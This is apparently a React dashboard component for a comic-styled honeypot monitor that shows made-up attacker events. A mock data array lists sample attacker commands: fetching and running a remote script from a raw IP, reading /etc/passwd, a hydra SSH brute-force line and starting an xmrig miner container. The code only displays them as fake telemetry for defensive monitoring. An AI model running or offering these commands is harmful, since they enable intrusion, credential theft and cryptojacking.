'use client'

import React, { useEffect, useState, useRef } from 'react'

interface AttackerEvent {
  id: string
  ip: string
  country: string
  city: string
  isp: string
  honeypot_type: string
  event_type: string
  risk_score: number
  commands: string[]
  ai_summary: string
  created_at: string
  stageX: number // Percentage position on theater floor
  stageY: number // Percentage position on theater floor
  silhouetteType: 'runner' | 'sneaker' | 'scouter'
}

interface Stats {
  total_events: number
  high_risk_events: number
  unique_countries: string[]
}

// Hand-drawn custom vector paths for our comic shadow attackers
const SHADOW_SILHOUETTES = {
  runner: "M 10 80 C 10 80, 15 50, 25 45 C 30 40, 35 30, 30 20 C 25 10, 45 5, 50 15 C 55 25, 45 35, 50 40 C 55 45, 65 50, 70 60 C 75 70, 80 80, 85 85 C 90 90, 65 85, 55 75 C 50 70, 40 75, 30 80 Z",
  sneaker: "M 15 85 C 15 85, 20 65, 30 60 C 35 55, 30 45, 25 35 C 20 25, 40 15, 45 25 C 50 35, 40 45, 45 50 C 50 55, 60 55, 65 70 C 70 85, 50 85, 40 80 C 35 75, 25 80, 15 85 Z",
  scouter: "M 20 80 C 20 80, 25 55, 35 50 C 40 45, 42 32, 38 22 C 34 12, 52 8, 56 18 C 60 28, 52 38, 56 43 C 60 48, 68 52, 72 65 C 76 78, 60 80, 48 75 C 42 70, 32 75, 20 80 Z"
}

const MOCK_COUNTRIES = ['Germany', 'United States', 'China', 'Netherlands', 'Russia', 'Japan', 'Brazil', 'India']
const MOCK_ISPS = ['DigitalOcean, LLC', 'Amazon Technologies Inc.', 'OVH SAS', 'Chinanet', 'Comcast Cable', 'Linode, LLC']
const MOCK_HONEYPOTS = ['cowrie_ssh', 'conpot_ics', 'dionaea_malware', 'honeytrap_ext']
const MOCK_EVENT_TYPES = ['credential_spray', 'port_scan', 'exploit_attempt', 'rce_payload']
const MOCK_COMMANDS = [
  ['uname -a', 'wget http://185.220.101.45/bin.sh', 'chmod +x bin.sh', './bin.sh'],
  ['cat /etc/passwd', 'hydra -L users.txt -P pass.txt ssh://localhost'],
  ['docker ps -a', 'docker run -d --restart always xmrig'],
  ['sh', 'whoami', 'id', 'curl -s http://ip-api.com/json']
]
const MOCK_AI_SUMMARIES = [
  "Shadow vector aimed at port 22. Attacker attempted administrative credentials. Spotlight trapped credentials, redirecting execution to virtual sandbox layer.",
  "Stealth port scan detected targeting automated grids. Real-world target coordinates spoofed. Shadow now logs phantom feedback loops.",
  "Remote payload injection halted. Malicious script signature neutralized. Attacker trapped inside isolated theater stage loop."
]

// Correct implementation of getRisk in the root scope to fix the reference errors
function getRisk(score: number) {
  if (score >= 90) return { label: 'CRITICAL THREAT', color: '#ff2a5f', glow: '255,42,95', level: 'V' }
  if (score >= 70) return { label: 'HIGH SEVERITY', color: '#ff6b00', glow: '255,107,0', level: 'IV' }
  if (score >= 40) return { label: 'MEDIUM ACTIVITY', color: '#facc15', glow: '250,204,21', level: 'III' }
  return { label: 'MINIMAL RISK', color: '#00ff88', glow: '0,255,136', level: 'I' }
}

function generateInitialEvents(): AttackerEvent[] {
  const eventsList: AttackerEvent[] = []
  const silhouetteTypes: ('runner' | 'sneaker' | 'scouter')[] = ['runner', 'sneaker', 'scouter']

  for (let i = 0; i < 7; i++) {
    const risk_score = Math.floor(Math.random() * 80) + 20
    const country = MOCK_COUNTRIES[Math.floor(Math.random() * MOCK_COUNTRIES.length)]
    eventsList.push({
      id: `evt-${i}-${Math.random().toString(36).substring(2, 6)}`,
      ip: `185.220.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 254) + 1}`,
      country,
      city: country === 'Germany' ? 'Brandenburg an der Havel' : 'Metropolis Grid',
      isp: MOCK_ISPS[Math.floor(Math.random() * MOCK_ISPS.length)],
      honeypot_type: MOCK_HONEYPOTS[Math.floor(Math.random() * MOCK_HONEYPOTS.length)],
      event_type: MOCK_EVENT_TYPES[Math.floor(Math.random() * MOCK_EVENT_TYPES.length)],
      risk_score,
      commands: risk_score > 50 ? MOCK_COMMANDS[Math.floor(Math.random() * MOCK_COMMANDS.length)] : [],
      ai_summary: MOCK_AI_SUMMARIES[Math.floor(Math.random() * MOCK_AI_SUMMARIES.length)],
      created_at: new Date(Date.now() - (i * 2 * 3600 * 1000)).toISOString(),
      stageX: 15 + Math.random() * 70,
      stageY: 20 + Math.random() * 60,
      silhouetteType: silhouetteTypes[Math.floor(Math.random() * silhouetteTypes.length)]
    })
  }
  return eventsList
}

export default function Dashboard() {
  const [events, setEvents] = useState<AttackerEvent[]>([])
  const [stats, setStats] = useState<Stats | null>(null)
  const [selected, setSelected] = useState<AttackerEvent | null>(null)

  // Custom Comic UI Parameters driven by physical screen levers
  const [delusionLevel, setDelusionLevel] = useState<number>(75)
  const [focusLevel, setFocusLevel] = useState<number>(45)
  const [activeTab, setActiveTab] = useState<'DECOYS' | 'SCRIPTS' | 'TRAPS'>('DECOYS')
  const [threatLogs, setThreatLogs] = useState<string[]>([
    "10:42:01 - Decoy Stage initialised.",
    "10:42:05 - System spotlight active.",
    "10:43:10 - Trapping algorithms loaded successfully."
  ])

  // Refs for tracking interactive slider coordinates
  const delusionLeverRef = useRef<SVGSVGElement>(null)
  const focusLeverRef = useRef<SVGSVGElement>(null)

  useEffect(() => {
    const seeded = generateInitialEvents()
    setEvents(seeded)
    setSelected(seeded[0])
    setStats({
      total_events: 1422,
      high_risk_events: 89,
      unique_countries: ['Germany', 'United States', 'China', 'Russia', 'Netherlands']
    })

    // Simulated attack interceptor timeline feed with safe mock selections
    const generatorInterval = setInterval(() => {
      const randomCountry = MOCK_COUNTRIES[Math.floor(Math.random() * MOCK_COUNTRIES.length)]
      const randomIsp = MOCK_ISPS[Math.floor(Math.random() * MOCK_ISPS.length)]
      const randomHoneypot = MOCK_HONEYPOTS[Math.floor(Math.random() * MOCK_HONEYPOTS.length)]
      const randomEventType = MOCK_EVENT_TYPES[Math.floor(Math.random() * MOCK_EVENT_TYPES.length)]
      const randomCommands = MOCK_COMMANDS[Math.floor(Math.random() * MOCK_COMMANDS.length)]
      const randomAiSummary = MOCK_AI_SUMMARIES[Math.floor(Math.random() * MOCK_AI_SUMMARIES.length)]

      const freshEvent: AttackerEvent = {
        id: `live-evt-${Math.random().toString(36).substring(2, 7)}`,
        ip: `185.220.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 254) + 1}`,
        country: randomCountry,
        city: randomCountry === 'Germany' ? 'Brandenburg Gateway' : 'Metropolis Gateway',
        isp: randomIsp,
        honeypot_type: randomHoneypot,
        event_type: randomEventType,
        risk_score: Math.floor(Math.random() * 81) + 19,
        commands: randomCommands,
        ai_summary: randomAiSummary,
        created_at: new Date().toISOString(),
        stageX: 15 + Math.random() * 70,
        stageY: 20 + Math.random() * 60,
        silhouetteType: (['runner', 'sneaker', 'scouter'] as const)[Math.floor(Math.random() * 3)]
      }

      setEvents(prev => [freshEvent, ...prev.slice(0, 8)])
      setThreatLogs(prev => [
        `${new Date().toLocaleTimeString()} - Shadow detected on Spot ${freshEvent.honeypot_type}`,
        ...prev.slice(0, 15)
      ])

      // Dynamic stats increment
      setStats(prev => prev ? {
        total_events: prev.total_events + 1,
        high_risk_events: prev.high_risk_events + (freshEvent.risk_score >= 70 ? 1 : 0),
        unique_countries: Array.from(new Set([...prev.unique_countries, freshEvent.country]))
      } : null)

    }, 9000)

    return () => clearInterval(generatorInterval)
  }, [])

  const handleDelusionClick = (e: React.MouseEvent<SVGSVGElement>) => {
    if (!delusionLeverRef.current) return
    const rect = delusionLeverRef.current.getBoundingClientRect()
    const relativeX = e.clientX - rect.left
    const percent = Math.min(Math.max((relativeX / rect.width) * 100, 10), 90)
    setDelusionLevel(Math.round(percent))
  }

  const handleFocusClick = (e: React.MouseEvent<SVGSVGElement>) => {
    if (!focusLeverRef.current) return
    const rect = focusLeverRef.current.getBoundingClientRect()
    const relativeX = e.clientX - rect.left
    const percent = Math.min(Math.max((relativeX / rect.width) * 100, 10), 90)
    setFocusLevel(Math.round(percent))
  }

  return (
    <div className="w-full h-screen p-4 flex flex-col bg-[#eae5db] text-[#1c1c1f] font-mono select-none overflow-hidden">

      {/* Hand-drawn SVG patterns and halftone textures */}
      <svg className="hidden">
        <defs>
          <pattern id="halftonePattern" width="10" height="10" patternUnits="userSpaceOnUse" patternTransform="rotate(45 0 0)">
            <circle cx="5" cy="5" r="2" fill="#1c1c1f" opacity="0.08" />
          </pattern>
          <pattern id="halftoneRed" width="10" height="10" patternUnits="userSpaceOnUse" patternTransform="rotate(45 0 0)">
            <circle cx="5" cy="5" r="2.5" fill="#ff2a5f" opacity="0.15" />
          </pattern>
        </defs>
      </svg>

      {/* STYLES FOR INTENSE GRAPHIC RETRO COMIC-NOIR */}
      <style>{`
        .comic-border {
          border: 4px solid #1c1c1f;
          box-shadow: 4px 4px 0px #1c1c1f;
          border-radius: 4px;
        }
        .comic-card {
          background-color: #faf6f0;
          transition: transform 0.2s, box-shadow 0.2s;
        }
        .comic-card:hover {
          transform: translate(-1px, -1px);
          box-shadow: 5px 5px 0px #1c1c1f;
        }
        .halftone-bg {
          background-image: url('#halftonePattern');
          background: fill;
        }
        .paper-overlay {
          background: linear-gradient(135deg, rgba(255,255,255,0.15) 0%, rgba(0,0,0,0.02) 100%);
          pointer-events: none;
        }
      `}</style>

      {/* HEADER BAR: Authentic retro title typography */}
      <header className="w-full flex flex-col lg:flex-row items-center justify-between p-4 mb-4 bg-[#faf6f0] comic-border relative">
        <div className="absolute inset-0 paper-overlay" />

        <div className="flex items-center gap-4 z-10">
          <div className="p-1 border-2 border-[#1c1c1f] bg-[#ff2a5f] transform -rotate-3">
            <svg width="40" height="40" viewBox="0 0 36 36" fill="none">
              <polygon points="18,2 32,8 32,28 18,34 4,28 4,8" fill="#1c1c1f" stroke="#ffffff" strokeWidth="2" />
              <circle cx="18" cy="18" r="6" fill="#ff2a5f" />
              <line x1="18" y1="2" x2="18" y2="34" stroke="#ffffff" strokeWidth="1" strokeDasharray="3 3" />
            </svg>
          </div>
          <div>
            <h1 className="text-3xl font-extrabold tracking-tighter uppercase text-[#1c1c1f] transform -rotate-1">
              THE DECOYSHIELD SHADOW THEATER
            </h1>
            <p className="text-xs font-bold tracking-widest text-[#1c1c1f]/60 uppercase">
              PREDATOR STAGE // INTRUDER CONTAINMENT SIMULATION
            </p>
          </div>
        </div>

        {/* Dynamic Halftone Stats Deck */}
        <div className="flex flex-wrap gap-4 mt-4 lg:mt-0 z-10">
          {[
            { label: 'TOTAL EVENTS', value: stats?.total_events.toString() ?? '0', color: '#faf6f0' },
            { label: 'HIGH RISK', value: stats?.high_risk_events.toString() ?? '0', color: '#ff2a5f', isAlert: true },
            { label: 'NATIONS TRACKED', value: stats?.unique_countries.length.toString() ?? '0', color: '#faf6f0' },
            { label: 'DECOYS ALIVE', value: '7', color: '#00ff88', textDark: true },
          ].map((s, index) => (
            <div
              key={index}
              className="px-4 py-2 border-2 border-[#1c1c1f] flex flex-col items-center min-w-[100px] relative"
              style={{
                backgroundColor: s.color,
                boxShadow: '2px 2px 0px #1c1c1f',
                color: s.textDark ? '#1c1c1f' : (s.isAlert ? '#ffffff' : '#1c1c1f'),
                transform: `rotate(${(index % 2 === 0 ? 1 : -1) * 1.5}deg)`
              }}>
              <span className="text-[9px] font-black tracking-wider opacity-60">{s.label}</span>
              <span className="text-xl font-black tracking-tight">{s.value}</span>
            </div>
          ))}
        </div>
      </header>

      {/* MAIN CONTAINER */}
      <div className="flex-1 w-full grid grid-cols-1 lg:grid-cols-12 gap-4 overflow-hidden">

        {/* LEFT COMPANION PANEL (Levers, Mode & Logs) */}
        <div className="lg:col-span-3 flex flex-col gap-4 overflow-hidden">

          {/* INTERACTIVE CONTROLS PANEL */}
          <div className="comic-border bg-[#faf6f0] p-4 flex flex-col gap-4 relative">
            <div className="absolute inset-0 opacity-10" style={{ backgroundImage: 'url(#halftonePattern)' }} />
            <h3 className="text-sm font-black tracking-widest border-b-2 border-[#1c1c1f] pb-2 uppercase z-10">
              OPERATIONAL SWITCHES
            </h3>

            {/* Interactive Physical Lever 1: DELUSION */}
            <div className="flex flex-col gap-2 z-10">
              <div className="flex justify-between text-xs font-black">
                <span>DELUSION THROTTLE</span>
                <span className="text-[#ff2a5f]">{delusionLevel}%</span>
              </div>
              <div className="bg-[#eae5db] p-2 border-2 border-[#1c1c1f] relative rounded">
                <svg
                  ref={delusionLeverRef}
                  onClick={handleDelusionClick}
                  className="w-full h-10 cursor-pointer"
                  viewBox="0 0 180 40">
                  <rect x="10" y="16" width="160" height="8" fill="#1c1c1f" rx="4" />
                  <line x1="10" y1="20" x2="170" y2="20" stroke="#eae5db" strokeWidth="2" strokeDasharray="2 4" />
                  <line x1={`${10 + (delusionLevel * 1.6)}`} y1="4" x2={`${10 + (delusionLevel * 1.6)}`} y2="36" stroke="#1c1c1f" strokeWidth="3" />
                  <g transform={`translate(${10 + (delusionLevel * 1.6) - 10}, 8)`} className="cursor-grab active:cursor-grabbing">
                    <rect x="3" y="0" width="14" height="24" fill="#ff2a5f" rx="3" stroke="#1c1c1f" strokeWidth="2" />
                    <line x1="10" y1="4" x2="10" y2="20" stroke="#ffffff" strokeWidth="2" />
                    <circle cx="10" cy="12" r="3" fill="#1c1c1f" />
                  </g>
                </svg>
              </div>
              <p className="text-[10px] text-slate-500 italic">Adjusts simulation clock cycle decoy mirroring rates.</p>
            </div>

            {/* Interactive Physical Lever 2: FOCUS */}
            <div className="flex flex-col gap-2 z-10">
              <div className="flex justify-between text-xs font-black">
                <span>LIGHT APERTURE FOCUS</span>
                <span className="text-[#ff2a5f]">{focusLevel}%</span>
              </div>
              <div className="bg-[#eae5db] p-2 border-2 border-[#1c1c1f] relative rounded">
                <svg
                  ref={focusLeverRef}
                  onClick={handleFocusClick}
                  className="w-full h-10 cursor-pointer"
                  viewBox="0 0 180 40">
                  <rect x="10" y="16" width="160" height="8" fill="#1c1c1f" rx="4" />
                  <line x1="10" y1="20" x2="170" y2="20" stroke="#eae5db" strokeWidth="2" strokeDasharray="2 4" />
                  <line x1={`${10 + (focusLevel * 1.6)}`} y1="4" x2={`${10 + (focusLevel * 1.6)}`} y2="36" stroke="#1c1c1f" strokeWidth="3" />
                  <g transform={`translate(${10 + (focusLevel * 1.6) - 10}, 8)`}>
                    <rect x="3" y="0" width="14" height="24" fill="#ff6b00" rx="3" stroke="#1c1c1f" strokeWidth="2" />
                    <line x1="10" y1="4" x2="10" y2="20" stroke="#ffffff" strokeWidth="2" />
                    <circle cx="10" cy="12" r="3" fill="#1c1c1f" />
                  </g>
                </svg>
              </div>
              <p className="text-[10px] text-slate-500 italic">Alters spotlight coverage threshold footprint filters.</p>
            </div>

          </div>

          {/* REALTIME SYSTEM TELEMETRY LOGGER */}
          <div className="flex-1 comic-border bg-[#faf6f0] p-4 flex flex-col gap-2 overflow-hidden relative">
            <h3 className="text-sm font-black tracking-widest border-b-2 border-[#1c1c1f] pb-2 uppercase">
              THEATER SCRIPT EVENTS
            </h3>
            <div className="flex-1 overflow-y-auto font-mono text-[11px] leading-relaxed flex flex-col gap-1 pr-1 text-[#1c1c1f]/80">
              {threatLogs.map((log, i) => (
                <div key={i} className="border-b border-[#1c1c1f]/10 pb-1">
                  {log}
                </div>
              ))}
            </div>
          </div>

        </div>

        {/* CENTER COMPANION PANEL: The Theater Floor Grid (Visual Stage) */}
        <div className="lg:col-span-6 flex flex-col gap-4 overflow-hidden relative">

          <div className="flex-1 comic-border bg-[#faf6f0] flex flex-col p-4 relative overflow-hidden">
            <div className="absolute inset-0 pointer-events-none opacity-[0.05]" style={{ backgroundImage: 'url(#halftonePattern)' }} />

            <div className="flex justify-between items-center mb-2 pb-2 border-b-2 border-[#1c1c1f] z-10">
              <span className="text-xs font-black tracking-widest uppercase">STAGE VIEW: LIVE TARGET CAPTURE CODES</span>
              <span className="text-xs font-black text-[#ff2a5f] animate-pulse">● PREDATOR VIEW LIVE</span>
            </div>

            {/* STAGE SCREEN (SVG Perspective Grid representation) */}
            <div className="flex-1 relative border-2 border-[#1c1c1f] bg-[#fdfcfa] flex items-center justify-center overflow-hidden shadow-inner">

              <svg className="absolute inset-0 w-full h-full" viewBox="0 0 600 400" preserveAspectRatio="none">

                {/* 1. Perspective Tiled Grid Floor */}
                <g stroke="#1c1c1f" strokeWidth="1" strokeOpacity="0.15">
                  {Array.from({ length: 13 }).map((_, i) => {
                    const progress = i / 12
                    const xTop = 150 + progress * 300
                    const xBottom = -50 + progress * 700
                    return <line key={i} x1={xTop} y1="40" x2={xBottom} y2="400" />
                  })}
                  {Array.from({ length: 10 }).map((_, i) => {
                    const y = 40 + Math.pow(i / 9, 1.5) * 360
                    return <line key={i} x1="0" y1={y} x2="600" y2={y} />
                  })}
                </g>

                {/* 2. Decoy Core Spotlight Lamp elements */}
                <rect x="0" y="0" width="600" height="30" fill="#faf6f0" stroke="#1c1c1f" strokeWidth="2" />
                <line x1="0" y1="30" x2="600" y2="30" stroke="#1c1c1f" strokeWidth="2" />
                {[100, 250, 400, 500].map((lampX, i) => (
                  <g key={i} transform={`translate(${lampX}, 18)`}>
                    <line x1="0" y1="-8" x2="0" y2="12" stroke="#1c1c1f" strokeWidth="2" />
                    <rect x="-10" y="12" width="20" height="10" rx="2" fill="#1c1c1f" />
                  </g>
                ))}

                {/* 3. Render Custom Spotlight Cones */}
                <polygon
                  points="250,30 100,400 450,400"
                  fill="url(#halftoneRed)"
                  opacity="0.35"
                />

                {/* ACTIVE HIGH-INTENSITY CONE pointing directly at the selected intruder */}
                {selected && (
                  <g>
                    <polygon
                      points={`250,30 ${(selected.stageX / 100) * 600 - (focusLevel * 1.5)},${(selected.stageY / 100) * 400 + 40} ${(selected.stageX / 100) * 600 + (focusLevel * 1.5)},${(selected.stageY / 100) * 400 + 40}`}
                      fill="#ff2a5f"
                      opacity="0.18"
                    />
                    <ellipse
                      cx={(selected.stageX / 100) * 600}
                      cy={(selected.stageY / 100) * 400}
                      rx={focusLevel * 1.1}
                      ry={focusLevel * 0.4}
                      fill="none"
                      stroke="#ff2a5f"
                      strokeWidth="2.5"
                      strokeDasharray="4 4"
                    />
                  </g>
                )}

                {/* 4. Render Attacker Shadow Silhouettes wandering the floor */}
                {events.map((evt) => {
                  const xCoord = (evt.stageX / 100) * 600
                  const yCoord = (evt.stageY / 100) * 400
                  const isSelected = selected?.id === evt.id

                  return (
                    <g
                      key={evt.id}
                      className="cursor-pointer"
                      onClick={() => setSelected(evt)}>

                      {/* Interactive target bracket borders [ ] */}
                      {isSelected && (
                        <g transform={`translate(${xCoord - 35}, ${yCoord - 45})`}>
                          <path d="M 0 10 L 0 0 L 10 0" stroke="#ff2a5f" strokeWidth="3" fill="none" />
                          <path d="M 60 0 L 70 0 L 70 10" stroke="#ff2a5f" strokeWidth="3" fill="none" />
                          <path d="M 0 45 L 0 55 L 10 55" stroke="#ff2a5f" strokeWidth="3" fill="none" />
                          <path d="M 60 55 L 70 55 L 70 45" stroke="#ff2a5f" strokeWidth="3" fill="none" />
                        </g>
                      )}

                      {/* Attacker Shadow Silhouette vector path */}
                      <g transform={`translate(${xCoord - 18}, ${yCoord - 36}) scale(0.4)`}>
                        <path
                          d={SHADOW_SILHOUETTES[evt.silhouetteType]}
                          fill={isSelected ? '#ff2a5f' : '#1c1c1f'}
                          stroke={isSelected ? '#ffffff' : 'none'}
                          strokeWidth="2"
                        />
                      </g>

                      {/* Small Indicator dot under foot */}
                      <ellipse
                        cx={xCoord}
                        cy={yCoord}
                        rx="12"
                        ry="4"
                        fill={isSelected ? '#ff2a5f' : '#1c1c1f'}
                        opacity="0.3"
                      />

                      {/* Quick IP text above */}
                      <text
                        x={xCoord}
                        y={yCoord - 42}
                        fontFamily="monospace"
                        fontSize="10"
                        fontWeight="bold"
                        fill={isSelected ? '#ff2a5f' : '#1c1c1f'}
                        textAnchor="middle">
                        {evt.ip}
                      </text>
                    </g>
                  )
                })}

                {/* 5. Comic Bubble for selected IP */}
                {selected && (
                  <g transform={`translate(${(selected.stageX / 100) * 600 - 90}, ${(selected.stageY / 100) * 400 - 95})`}>
                    <path
                      d="M 5 5 L 175 5 L 175 40 L 100 40 L 90 55 L 85 40 L 5 40 Z"
                      fill="#faf6f0"
                      stroke="#1c1c1f"
                      strokeWidth="2.5"
                    />
                    <text x="90" y="20" fontSize="9" fontWeight="900" fill="#1c1c1f" textAnchor="middle">
                      PAYLOAD CAPTURED
                    </text>
                    <text x="90" y="32" fontSize="9" fontWeight="900" fill="#ff2a5f" textAnchor="middle">
                      {selected.event_type.replace(/_/g, ' ').toUpperCase()}
                    </text>
                  </g>
                )}

              </svg>

              <div className="absolute bottom-2 left-2 px-2 py-1 bg-[#1c1c1f] text-[#faf6f0] text-[9px] font-bold uppercase transform -rotate-1">
                Trigger spotlight: click a shadow silhouette
              </div>

            </div>

            {/* COMIC ACTION TABS BAR */}
            <div className="grid grid-cols-3 gap-2 mt-4 z-10">
              {[
                { id: 'DECOYS', label: 'DEPLOY NEW SPOTS' },
                { id: 'SCRIPTS', label: 'ANALYZE SCRIPTS' },
                { id: 'TRAPS', label: 'CONTAINMENT TRAPS' }
              ].map((tab) => (
                <button
                  key={tab.id}
                  onClick={() => setActiveTab(tab.id as any)}
                  className="px-2 py-3 border-4 border-[#1c1c1f] font-black text-[11px] uppercase tracking-wider text-center cursor-pointer transition-all active:translate-y-1"
                  style={{
                    backgroundColor: activeTab === tab.id ? '#ff2a5f' : '#faf6f0',
                    color: activeTab === tab.id ? '#ffffff' : '#1c1c1f',
                    boxShadow: activeTab === tab.id ? '0px 0px 0px' : '4px 4px 0px #1c1c1f'
                  }}>
                  {tab.label}
                </button>
              ))}
            </div>

          </div>

        </div>

        {/* RIGHT COMPANION PANEL: The Redacted Dossier file */}
        <div className="lg:col-span-3 flex flex-col overflow-hidden">

          <div className="flex-1 comic-border bg-[#faf6f0] p-4 flex flex-col gap-4 overflow-y-auto relative">
            <div className="absolute inset-0 opacity-5" style={{ backgroundImage: 'url(#halftonePattern)' }} />

            {selected ? (
              <div className="flex flex-col gap-4 z-10">

                {/* Dossier Header */}
                <div className="border-b-4 border-double border-[#1c1c1f] pb-3 relative">
                  <span className="text-[10px] font-black tracking-widest text-[#1c1c1f]/50 uppercase">
                    CLASSIFIED FILE NO: ST-{selected.id.substring(0, 5).toUpperCase()}
                  </span>
                  <h2 className="text-2xl font-black tracking-tight text-[#1c1c1f] break-all leading-none mt-1">
                    {selected.ip}
                  </h2>
                  <div className="text-xs font-bold text-[#ff2a5f] mt-1">
                    {selected.city.toUpperCase()} // {selected.country.toUpperCase()}
                  </div>

                  {/* Stamp Graphic Warning Overlay */}
                  <div className="absolute top-0 right-0 transform rotate-12 scale-90">
                    {selected.risk_score >= 60 ? (
                      <div className="stamp-red border-4 border-dashed border-[#ff2a5f] text-[#ff2a5f] px-2 py-1 font-black text-[10px] uppercase bg-[#faf6f0]/90">
                        HIGH HAZARD
                      </div>
                    ) : (
                      <div className="stamp-gold border-4 border-dashed border-[#facc15] text-[#facc15] px-2 py-1 font-black text-[10px] uppercase bg-[#faf6f0]/90">
                        TRAPPED STAGE
                      </div>
                    )}
                  </div>
                </div>

                {/* Grid readouts */}
                <div className="flex flex-col gap-2">
                  {[
                    ['NETWORK ENTRY', selected.honeypot_type],
                    ['SIGNATURE DETECTED', selected.event_type.replace(/_/g, ' ')],
                    ['INTERNET PROVIDER', selected.isp],
                    ['RISK LEVEL', `LVL ${getRisk(selected.risk_score).level} (${selected.risk_score}%)`]
                  ].map(([key, val]) => (
                    <div key={key} className="p-2 border-2 border-[#1c1c1f] bg-[#fcf9f2] rounded">
                      <div className="text-[9px] font-black text-slate-500 uppercase">{key}</div>
                      <div className="text-[11px] font-bold text-[#1c1c1f] uppercase">{val}</div>
                    </div>
                  ))}
                </div>

                {/* Threat score progress bar */}
                <div className="p-3 border-2 border-[#1c1c1f] bg-[#fcf9f2] rounded">
                  <div className="flex justify-between text-[10px] font-black mb-1">
                    <span>DELUSION COEFFICIENT</span>
                    <span className="text-[#ff2a5f]">{selected.risk_score}% CAPTURED</span>
                  </div>
                  <div className="h-4 bg-[#eae5db] border-2 border-[#1c1c1f] overflow-hidden rounded relative">
                    <div
                      className="h-full bg-[#ff2a5f] transition-all duration-1000"
                      style={{
                        width: `${selected.risk_score}%`,
                        backgroundImage: 'url(#halftoneRed)'
                      }}
                    />
                  </div>
                </div>

                {/* Keystrokes Log */}
                <div className="p-3 border-2 border-[#1c1c1f] bg-[#1c1c1f] text-[#00ff88] rounded">
                  <div className="text-[9px] font-black text-[#faf6f0] tracking-wider mb-2 border-b border-[#faf6f0]/20 pb-1">
                    CAPTURED SHELL TELEMETRY
                  </div>
                  {selected.commands && selected.commands.length > 0 ? (
                    <div className="flex flex-col gap-1 font-mono text-[10px]">
                      {selected.commands.map((cmd, i) => (
                        <div key={i} className="break-all">
                          $ <span className="text-white">{cmd}</span>
                        </div>
                      ))}
                    </div>
                  ) : (
                    <div className="text-[10px] italic text-[#faf6f0]/50 text-center py-2">
                      Passive scouting detected. Mirror system active.
                    </div>
                  )}
                </div>

                {/* AI Summary report styled with Redacted boxes */}
                {selected.ai_summary && (
                  <div className="p-3 border-2 border-dashed border-[#1c1c1f] bg-[#faf6f0] relative">
                    <div className="text-[9px] font-black text-slate-500 uppercase mb-1">TACTICAL INTERPRETATION REPORT</div>
                    <p className="text-[11px] leading-relaxed font-mono text-slate-700">
                      {selected.ai_summary}
                    </p>
                  </div>
                )}

              </div>
            ) : (
              <div className="h-full flex items-center justify-center text-center p-6 text-slate-400 italic text-xs">
                Select an intruder on the theater floor to open tactical case file dossier.
              </div>
            )}

          </div>

        </div>

      </div>

    </div>
  )
}